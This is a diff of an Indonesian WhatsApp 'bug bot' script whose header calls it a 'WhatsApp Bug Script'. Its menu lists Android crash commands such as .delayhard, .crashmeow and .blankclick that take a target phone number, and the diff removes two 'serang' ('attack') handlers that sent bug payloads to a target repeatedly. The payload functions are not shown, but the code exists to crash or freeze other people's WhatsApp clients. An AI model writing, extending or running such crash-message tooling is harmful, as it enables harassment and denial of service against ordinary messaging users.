@@ -569,7 +569,6 @@ async function sendWAMenu(sock, from, mek, sender) {
 ▸ .status  — status bot
 
 \`「 ANDROID BUG 」\`
-▸ .delayhard (bug in place)
 ▸ .delayhard 62xxx
 ▸ .crashmeow 62xxx
 ▸ .blankclick 62xxx
@@ -593,7 +592,7 @@ Berakhir pada ${expiredStr}`;
     const msg = generateWAMessageFromContent(from, proto.Message.fromObject({
       interactiveMessage: {
         header: {
-          title: "Credit By H3ysaka",
+          title: "> Credit By H3ysaka",
           subtitle: "WhatsApp Bug Script",
           hasMediaAttachment: true,
           ...imagePayload
@@ -721,27 +720,6 @@ if (body.trim().toLowerCase() === "bubar") {
   } catch (e) {}
   return;
 }
-
-if (body.trim().toLowerCase().startsWith("serang")) {
-  const args = body.trim().split(/\s+/).slice(1);
-  if (!args[0]) return;
-
-  const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
-  console.log("[serang] target:", target);
-
-  try {
-    await bug1(sock, target);
-    await bug1(sock, target);
-    console.log("[serang] bug terkirim");
-  } catch (e) {
-    console.log("[serang] error:", e?.message || e);
-  }
-
-  await sock.sendMessage(from, {
-    text: "done c1"
-  }, { quoted: mek });
-  return;
-}
     // ===== END TRIGGER =====
 
     if (!body.startsWith(".")) return;
@@ -781,21 +759,6 @@ if (body.trim().toLowerCase().startsWith("serang")) {
         }, { quoted: mek });
         break;
       }
-
-case 'serang': {
-  if (!botNumber) return sock.sendMessage(m.chat, { text: "This Feature Only Send By Bot Number" }, { quoted: m });
-
-  const target = args[0]?.replace(/\D/g, "") + "@s.whatsapp.net";
-  if (!args[0]) return;
-
-  for (let r = 0; r < 5; r++) {
-    await helonyet(sock, m.chat);
-  }
-
-  await sock.sendMessage(m.chat, { text: "done c1" }, { quoted: m });
-  console.log(chalk.red.bold("Success!"));
-  break;
-}
 
       case "delayhard": {
         if (!args[0]) return sock.sendMessage(from, { text: "❌ Contoh: .delayhard 628123456789" }, { quoted: mek });
